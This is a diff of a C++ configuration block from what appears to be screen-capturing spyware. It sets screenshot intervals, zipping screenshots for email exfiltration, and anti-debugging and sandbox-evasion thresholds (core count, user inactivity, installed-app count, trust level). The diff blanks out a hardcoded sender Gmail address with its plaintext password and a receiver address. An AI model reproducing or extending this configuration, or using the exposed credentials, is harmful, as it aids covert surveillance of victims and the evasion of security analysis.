@@ -50,9 +50,9 @@ using buffer = std::vector<char>;
 #define RequiredCores 2     //                                               (anti-dbg feature)
 #define SecondsBetweenScreenshots 20
 #define ScreenshotsPerZip 4
-#define SendersEmail "indexmagik@gmail.com"
-#define SendersPsw "*MaGiK77"
-#define RecieversEmail "bratvolk913@gmail.com"
+#define SendersEmail ""
+#define SendersPsw ""
+#define RecieversEmail ""
 #define MaxInactivity 10    //max amount of seconds since last input         (anti-dbg feature)
 #define MinRequiredApps 20  //minimum amount of installed programs           (anti-dbg feature)
 #define SecurityLevel 0     //0-3 levels of trust towards environment        (anti-dbg feature)
